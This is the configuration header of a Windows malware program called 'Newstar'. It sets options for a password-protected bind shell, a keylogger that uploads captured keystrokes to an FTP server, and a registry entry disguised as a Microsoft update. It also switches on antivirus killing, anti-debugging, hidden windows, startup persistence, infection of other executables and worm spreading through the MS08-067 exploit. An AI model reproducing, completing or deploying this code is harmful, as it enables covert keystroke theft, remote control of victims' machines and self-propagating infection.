/**********************MODIFY VALUE ONLY***************************/
#define ModuleMutex "001486490"		// Mutex to program
#define RegFileDes  "Microsoft Windows Automated Update" // Registry Description
#define BindShellPort 1234			// BindShell Port for server to listen to
#define BindShellPass "213jfwer4"	// Secure bindshell password
#define KeylogFile "\\syslog.txt"	// Log file stored in SystemDir, contains Keylogged characters, keep the "\\"
#define UserAgent "Newstar"			// User agent, used with InternetConnect to connect to FTP

#define FtpServer   "localhost"		// FTP Server address
#define FtpUsername "username"		// FTP Username
#define FtpPassword "password"		// FTP Password
#define FtpFilename "info.txt"		// Store to filename on FTP
#define FtpLogTime	300000			// Number of milliseconds to wait update log on FTP server: Seconds*1000, Default is 5 Minutes
/******************************************************************/

/************************FULLY MODIFIABLE**************************/
#define KILL_ANTI_VIRUS	// Kill Anti Virus's
#define KILL_OTHER_MAL	// Prevents other malware from running (by creating their mutex with CreateMutex())
#define ANTI_DEBUGGING	// Anti Debugging technique, armoring from usermode debuggers.
#define INSTALL_STARTUP	// Copies to the registry startup, and to the system folder
#define WINDOW_STEALTH	// Hides this modules process window.
#define BIN_MESSAGE "messagehere" // Replace with the message you want to embed in this program
#define INFECT_EXES		// Infect all exe's in the current directory
#define EXPLOIT_SPREAD	// Use MS08-067 Remote Stack Overflow Vulnerability Exploit to spread
#define FIU_TECHNIQUE	// Dynamically open its own module to prevent it from being force deleted while running
#define COMPANION_PROC	// Companion Process
/******************************************************************/

/****************************DONT MODIFY***************************/
#pragma message("Newstar: Compiling on: " __TIMESTAMP__ ", Alias: " __FILE__ "\n")
#pragma comment(linker, "-lws2_32")	// Link with ws2_32
#pragma comment(linker, "-lwininet")// Link with wininet

#ifdef BIN_MESSAGE
const char AbinMSG[] = {BIN_MESSAGE};
#endif
const char RUNJ[] = "\x43\x72\x65\x61\x74\x65\x64\x20\x62\x79\x20\x42\x75\x6c\x6c"
"\x20\x4d\x6f\x6f\x73\x65\x20\x28\x46\x6f\x72\x6d\x65\x72\x6c\x79\x20\x41\x54\x4d"
"\x4c\x29\x20\x75\x6e\x64\x65\x72\x20\x74\x68\x65\x20\x47\x50\x4c\x2e";
/******************************************************************/
